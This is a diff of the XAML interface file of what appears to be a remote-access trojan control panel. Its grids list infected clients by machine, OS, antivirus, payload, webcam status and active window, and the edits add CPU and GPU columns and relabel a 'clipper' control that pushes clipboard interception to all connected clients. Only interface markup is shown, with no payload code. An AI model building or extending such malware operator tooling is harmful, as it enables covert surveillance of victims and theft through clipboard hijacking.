@@ -160,9 +160,8 @@
     </Window.Resources>
 
     <!-- ── Window chrome ──────────────────────────────────────────── -->
-    <!-- Margin="5" leaves transparent edges so the OS resize handles are reachable -->
     <Border x:Name="RootBorder" Background="#0C0D18" CornerRadius="8" BorderThickness="1"
-            BorderBrush="#1C1E30" Margin="5">
+            BorderBrush="#1C1E30">
 
         <Grid>
             <Grid.RowDefinitions>
@@ -592,15 +591,9 @@
                                     <DataGridTextColumn Header="AV"        Binding="{Binding Antivirus}"                          Width="100" FontSize="11"/>
                                     <DataGridTextColumn Header="PAYLOAD"   Binding="{Binding Payload}"                            Width="95"  FontSize="11"/>
                                     <DataGridTextColumn Header="1ST SEEN"  Binding="{Binding FirstSeen, StringFormat=yyyy-MM-dd}" Width="84"  FontFamily="Consolas" FontSize="11"/>
-                                    <DataGridTemplateColumn Header="CPU"   Width="62" SortMemberPath="CpuUsage">
-                                        <DataGridTemplateColumn.CellTemplate>
-                                            <DataTemplate>
-                                                <TextBlock Text="{Binding CpuDisplay}" Foreground="{Binding CpuBrush}"
-                                                           FontFamily="Consolas" FontSize="11" VerticalAlignment="Center" Margin="10,0"/>
-                                            </DataTemplate>
-                                        </DataGridTemplateColumn.CellTemplate>
-                                    </DataGridTemplateColumn>
-                                    <DataGridTextColumn Header="RAM"       Binding="{Binding RamDisplay}"   Width="105" FontFamily="Consolas" FontSize="11"/>
+                                    <DataGridTextColumn Header="CPU"      Binding="{Binding CpuDisplay}"   Width="130" FontSize="11"/>
+                                    <DataGridTextColumn Header="GPU"      Binding="{Binding GpuDisplay}"   Width="130" FontSize="11"/>
+                                    <DataGridTextColumn Header="RAM"      Binding="{Binding RamDisplay}"   Width="105" FontFamily="Consolas" FontSize="11"/>
                                     <DataGridTextColumn Header="CAM"       Binding="{Binding CameraStatus}" Width="44"  FontSize="11"/>
                                     <DataGridTextColumn Header="WINDOW"    Binding="{Binding ActiveWindow}" Width="140" />
                                     <DataGridTemplateColumn Header="PING"  Width="70" MinWidth="50" SortMemberPath="PingMs">
@@ -736,6 +729,8 @@
                                     <DataGridTextColumn Header="MACHINE"   Binding="{Binding LastMachineName}"                              Width="120" />
                                     <DataGridTextColumn Header="OS"        Binding="{Binding LastOS}"                                       Width="115" />
                                     <DataGridTextColumn Header="AV"        Binding="{Binding LastAntivirus}"                                Width="100" FontSize="11"/>
+                                    <DataGridTextColumn Header="CPU"       Binding="{Binding LastCpuName}"                                  Width="120" FontSize="11"/>
+                                    <DataGridTextColumn Header="GPU"       Binding="{Binding LastGpuName}"                                  Width="120" FontSize="11"/>
                                     <DataGridTextColumn Header="PAYLOAD"   Binding="{Binding LastPayload}"                                  Width="90"  FontSize="11"/>
                                     <DataGridTextColumn Header="FIRST SEEN" Binding="{Binding FirstSeen, StringFormat=yyyy-MM-dd HH:mm}"   Width="118" FontFamily="Consolas" FontSize="11"/>
                                     <DataGridTextColumn Header="LAST SEEN"  Binding="{Binding LastSeen,  StringFormat=yyyy-MM-dd HH:mm}"   Width="*"   FontFamily="Consolas" FontSize="11"/>
@@ -1654,7 +1649,7 @@
                                                        VerticalAlignment="Center" Margin="14,0,0,0"/>
                                         </StackPanel>
                                         <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
-                                            <Button x:Name="BtnClipperStart" Content="INTERCEPT" Height="30" Padding="14,0"
+                                            <Button x:Name="BtnClipperStart" Content="START" Height="30" Padding="14,0"
                                                     Margin="0,0,6,0" Style="{StaticResource SGreenBtn}"
                                                     Click="ClipperStart_Click"
                                                     ToolTip="Enable clipper and push to all connected clients"/>
